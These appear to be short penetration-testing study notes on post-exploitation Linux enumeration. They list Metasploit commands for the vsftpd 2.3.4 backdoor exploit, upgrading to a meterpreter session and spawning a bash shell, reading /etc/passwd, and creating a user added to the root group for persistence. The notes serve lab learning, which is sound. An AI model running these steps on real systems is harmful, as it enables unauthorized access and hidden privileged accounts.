### What we are looking for?
* Current user and privileges
* Other users on the system
* Groups

* PRACTICAL
* Inside msfconsole
* `use exploit/unix/ftp/vsftpd_234_backdoor`
* `run` --> Shell
* `sessions -u 1`
* Inside meterpreter:
* `shell`
* `/bin/bash -i`
* `whoami`
* `groups [user name]`
* `cat /etc/passwd`
* The service account will have /nologin associated with it, That's how you differentiate the user accounts from service accounts
* `cat /etc/passwd | grep -v /nologin`
* `useradd -m [username] -s /bin/bash`
* We cna check this user under:
  * `ls -al /home`
 
* `groups [username]`
* `usermod -aG root bob` -> This will give root privileges to a user account named "bob"
* `lastlog`
